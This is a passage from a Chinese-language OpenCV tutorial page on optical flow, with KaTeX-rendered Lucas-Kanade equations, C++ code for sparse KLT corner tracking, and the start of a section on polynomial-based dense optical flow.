fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">d=\begin{bmatrix}u    \\ v    \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">u</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>=</mo><msup><mi>A</mi><mi>T</mi></msup><mi>A</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>∑</mo><mrow><msub><mi>I</mi><mi>x</mi></msub><msub><mi>I</mi><mi>x</mi></msub></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>∑</mo><mrow><msub><mi>I</mi><mi>x</mi></msub><msub><mi>I</mi><mi>y</mi></msub></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>∑</mo><mrow><msub><mi>I</mi><mi>x</mi></msub><msub><mi>I</mi><mi>y</mi></msub></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>∑</mo><mrow><msub><mi>I</mi><mi>y</mi></msub><msub><mi>I</mi><mi>y</mi></msub></mrow></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">M=A^TA=\begin{bmatrix}\sum{I_xI_x} &amp;\sum{I_xI_y}  \\\sum{I_xI_y}  &amp;\sum{I_yI_y} \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>A</mi><mi>T</mi></msup><mi>b</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>∑</mo><mrow><msub><mi>I</mi><mi>x</mi></msub><msub><mi>I</mi><mi>t</mi></msub></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>∑</mo><mrow><msub><mi>I</mi><mi>y</mi></msub><msub><mi>I</mi><mi>t</mi></msub></mrow></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A^Tb=\begin{bmatrix}\sum{I_xI_t}    \\ \sum{I_yI_t}    \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>$</p><ul><li>M就是Harris角点检测的方程，也就是满足空间一致性的只有角点才可以</li><li>使用角点检测获取到移动位置距离</li></ul><h4 id="代码实现-18"><a class="markdownIt-Anchor" href="#代码实现-18"></a> 代码实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat gray,old_gray;</span><br><span class="line"><span class="built_in">vector</span>&lt;Point2f&gt;corners;</span><br><span class="line"><span class="keyword">double</span> quality_level=<span class="number">0.01</span>;</span><br><span class="line"><span class="keyword">int</span> minDistance = <span class="number">5</span>;</span><br><span class="line">goodFeaturesToTrack(gray,corners,<span class="number">200</span>,quality_level,minDistance,Mat(),<span class="number">3</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">vector</span>&lt;Point2f&gt;pts[<span class="number">2</span>];</span><br><span class="line">pts[<span class="number">0</span>].insert(pts[<span class="number">0</span>].end(),corners.begin(),corners.end());</span><br><span class="line"><span class="built_in">vector</span>&lt;unchar&gt;status;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">float</span>&gt;err;</span><br><span class="line"><span class="comment">//重复迭代10，两次结果小于0.01就不再计算了</span></span><br><span class="line">TermCriteria cireria=TermCriteria(TermCriteria::COUNT+TermCriteria::EPS,<span class="number">10</span>,<span class="number">0.01</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">  <span class="comment">//稀疏光流</span></span><br><span class="line">  <span class="comment">//前一帧,当前帧,前一帧角点,当前帧角点,每个角点状态(只有ok才会检测),错误,光流场的大小,金字塔层数,停止条件,flag</span></span><br><span class="line">  calcOpticalFlowPyrLK(old_gray,gray,pts[<span class="number">0</span>],pts[<span class="number">1</span>],status,err,Size(<span class="number">21</span>,<span class="number">21</span>),<span class="number">3</span>,cireria,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">size_t</span> i=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;pts[<span class="number">1</span>].size();i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(status[i])&#123;</span><br><span class="line">      <span class="comment">//将有效的往前排</span></span><br><span class="line">      pts[<span class="number">0</span>][k]=pts[<span class="number">0</span>][i];</span><br><span class="line">      pts[<span class="number">1</span>][k++]=pts[<span class="number">1</span>][i];</span><br><span class="line">      circle(frame,pts[<span class="number">1</span>][i],<span class="number">2</span>,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">      line(frame,pts[<span class="number">0</span>][i],pts[<span class="number">1</span>][i],Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//update key points</span></span><br><span class="line">  pts[<span class="number">0</span>].resize(k);<span class="comment">//把k后面全扔了</span></span><br><span class="line">  pts[<span class="number">1</span>].resize(k);<span class="comment">//把k后面全扔了</span></span><br><span class="line">  imshow(<span class="string">&quot;KLT&quot;</span>,frame);</span><br><span class="line">  <span class="comment">//update frame</span></span><br><span class="line">  <span class="built_in">std</span>::swap(pts[<span class="number">1</span>],pts[<span class="number">0</span>]);</span><br><span class="line">  cv::swap(old_gray,gray);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>上面代码仅检测是否有效，会显示大量的点。下面增加移动距离的限制，使得跟踪效果更好一些</li><li>加上距离判断的话，有些角点就会被抛弃，需要初始化才能在下一次检测时继续做判断</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat gray,old_gray;</span><br><span class="line"><span class="built_in">vector</span>&lt;Point2f&gt;corners;</span><br><span class="line"><span class="keyword">double</span> quality_level=<span class="number">0.01</span>;</span><br><span class="line"><span class="keyword">int</span> minDistance = <span class="number">5</span>;</span><br><span class="line">goodFeaturesToTrack(gray,corners,<span class="number">200</span>,quality_level,minDistance,Mat(),<span class="number">3</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">vector</span>&lt;Point2f&gt;pts[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;Point2f&gt;initPoints;</span><br><span class="line">pts[<span class="number">0</span>].insert(pts[<span class="number">0</span>].end(),corners.begin(),corners.end());</span><br><span class="line">initPoints.insert(initPoints.end(),corners.begin(),corners.end());</span><br><span class="line"><span class="built_in">vector</span>&lt;unchar&gt;status;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">float</span>&gt;err;</span><br><span class="line">TermCriteria cireria=TermCriteria(TermCriteria::COUNT+TermCriteria::EPS,<span class="number">10</span>,<span class="number">0.01</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">  calcOpticalFlowPyrLK(old_gray,gray,pts[<span class="number">0</span>],pts[<span class="number">1</span>],status,err,Size(<span class="number">21</span>,<span class="number">21</span>),<span class="number">3</span>,cireria,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">size_t</span> i=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;pts[<span class="number">1</span>].size();i++)&#123;</span><br><span class="line">    <span class="keyword">double</span> dist = <span class="built_in">abs</span>(pts[<span class="number">0</span>].x-pts[<span class="number">1</span>].x)+<span class="built_in">abs</span>(pts[<span class="number">0</span>].y-pts[<span class="number">1</span>].y);</span><br><span class="line">    <span class="keyword">if</span>(status[i] &amp;&amp; dist&gt;<span class="number">2</span>)&#123;</span><br><span class="line">      <span class="comment">//将有效的往前排</span></span><br><span class="line">      initPoints[k]=initPoints[i];</span><br><span class="line">      pts[<span class="number">0</span>][k]=pts[<span class="number">0</span>][i];</span><br><span class="line">      pts[<span class="number">1</span>][k++]=pts[<span class="number">1</span>][i];</span><br><span class="line">      circle(frame,pts[<span class="number">1</span>][i],<span class="number">2</span>,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">      line(frame,pts[<span class="number">0</span>][i],pts[<span class="number">1</span>][i],Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//update key points</span></span><br><span class="line">  pts[<span class="number">0</span>].resize(k);<span class="comment">//把k后面全扔了</span></span><br><span class="line">  pts[<span class="number">1</span>].resize(k);<span class="comment">//把k后面全扔了</span></span><br><span class="line">  initPoints.resize(k);<span class="comment">//把k后面全扔了</span></span><br><span class="line">  <span class="comment">//绘制光流线</span></span><br><span class="line">  <span class="comment">//线的彩色</span></span><br><span class="line">  <span class="built_in">vector</span>&lt;Scalar&gt; lut;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;initPoints.size();t++)&#123;</span><br><span class="line">    <span class="keyword">int</span> b=rng.uniform(<span class="number">0</span>,<span class="number">255</span>),g=rng.uniform(<span class="number">0</span>,<span class="number">255</span>),r=rng.uniform(<span class="number">0</span>,<span class="number">255</span>);</span><br><span class="line">    lut.push_back(Scalar(b,g,r));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;initPoints.size();t++)&#123;</span><br><span class="line">    line(frame,initPoints[t],pts[<span class="number">1</span>][t],lut[t],<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  imshow(<span class="string">&quot;KLT&quot;</span>,frame);</span><br><span class="line">  <span class="comment">//update frame</span></span><br><span class="line">  <span class="built_in">std</span>::swap(pts[<span class="number">1</span>],pts[<span class="number">0</span>]);</span><br><span class="line">  cv::swap(old_gray,gray);</span><br><span class="line">  <span class="comment">//re-init</span></span><br><span class="line">  <span class="keyword">if</span> (pts[<span class="number">0</span>].size()&lt;<span class="number">40</span>)&#123;</span><br><span class="line">    goodFeaturesToTrack(gray,corners,<span class="number">200</span>,quality_level,minDistance,Mat(),<span class="number">3</span>,<span class="literal">false</span>);</span><br><span class="line">    pts[<span class="number">0</span>].insert(pts[<span class="number">0</span>].end(),corners.begin(),corners.end());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="稠密光流"><a class="markdownIt-Anchor" href="#稠密光流"></a> 稠密光流</h3><ul><li>稠密光流法有很多种</li></ul><h3 id="基于多项式的稠密光流法"><a class="markdownIt-Anchor" href="#基于多项式的稠密光流法"></a> 基于多项式的稠密光流法</h3><ul><li><p>像素点跟周围的像素点是相关性的</p></li><li><p>基于二次多项式实现光流评估算法</p></li><li><p>对每个像素点都计算移动距离</p></li><li><p>基于总位移与均值评估</p></li><li><p>数学描述，x是一个2*2的矩阵，代表(x,y)</p></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mi>T</mi></msup><msub><mi>A</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msubsup><mi>b</mi><mn>1</mn><mi>T</mi></msubsup><mi>x</mi><mo>+</mo><msub><mi>c</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">f_1(x)=x^TA_1x+b_1^Tx+c_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0413309999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.138331em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><ul><li>移动d后</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mi>d</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup><msub><mi>A</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mi>d</mi><mo stretchy="false">)</mo><mo>+</mo><msubsup><mi>b</mi><mn>1</mn><mi>T</mi></msubsup><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mi>d</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>x</mi><mi>T</mi></msup><msub><mi>A</mi><mn>2</mn></msub><mi>x</mi><mo>+</mo><msubsup><mi>b</mi><mn>2</mn><mi>T</mi></msubsup><mi>x</mi><mo>+</mo><msub><mi>c</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">f_2(x)=f_1(x-d)=(x-d)^TA_1(x-d)+b_1^T(x-d)+c_1=x^TA_2x+b^T_2x+c_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 